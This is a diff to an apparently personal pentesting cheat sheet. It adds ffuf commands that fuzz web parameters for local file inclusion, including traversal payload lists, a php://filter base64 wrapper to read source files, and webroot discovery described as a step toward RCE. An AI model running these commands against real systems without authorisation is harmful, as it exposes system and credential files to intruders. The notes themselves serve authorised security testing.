@@ -95,7 +95,7 @@ echo '<IP_ADDR> <VHOST>.<FQDN>' | sudo tee -a /etc/hosts
 Arjun will attempt to discover all parameters.
 
 ```bash
-pipx install arjun
+uv tool install arjun
 
 arjun -t 8 -oT arjun_parameter.txt -w large -m GET -u <TARGET>
 arjun -t 8 -oT arjun_parameter.txt -w large -m POST -u <TARGET>
@@ -143,14 +143,30 @@ Fuzzes a parameter with hundreds of `/etc/passwd` traversal permutations includi
 
 ### Linux
 
+**Tests many types of bypasses (nested, encoded, null bytes):**
 ```bash
-ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<TARGET>/<PAGE>?<PARAMETER>=FUZZ' -fs 0
+ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<TARGET>/<PAGE>?<PARAM>=FUZZ' -fs <SIZE>
 ```
 
-Once confirmed, fuzz for accessible config files, logs, and sensitive paths:
+**For when files is executed instead of being read:**
+```bash
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt:FUZZ -u 'http://<TARGET>/<PAGE>?<PARAM>=php://filter/read=convert.base64-encode/resource=FUZZ' -fs <SIZE>
+```
+
+**Once confirmed, fuzz for accessible config files, logs, and sensitive paths:**
+```bash
+# NOTE: <LFI_TRAVERSAL> is not always needed
+ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt:FUZZ -u 'http://<TARGET>/<PAGE>?<PARAMETER>=<LFI_TRAVERSAL>FUZZ' -fs 0 -v
+```
+
+#### Find Webroot
+
+- https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
+
+After discovering an LFI, getting the webroot is critical to enumerating more config files (before getting RCE)
 
 ```bash
-ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt:FUZZ -u 'http://<TARGET>/<PAGE>?<PARAMETER>=<LFI_TRAVERSAL>FUZZ' -fs 0 -v
+ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/<PAGE>?<PARAM>=../../../../FUZZ/index.php' -fs <SIZE>
 ```
 
 ### Windows
@@ -160,6 +176,8 @@ ffuf -w /usr/share/seclists/Fuzzing/LFI/Windows/Windows-LFI-Payloads_by-adeadfed
 ```
 
 Once confirmed, fuzz for accessible config files, logs, and sensitive paths:
+
+- https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
 
 ```bash
 ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-linux-and-windows-LFI-files.txt:FUZZ -u 'http://<TARGET>/<PAGE>?<PARAMETER>=<LFI_TRAVERSAL>FUZZ' -fs 0 -v
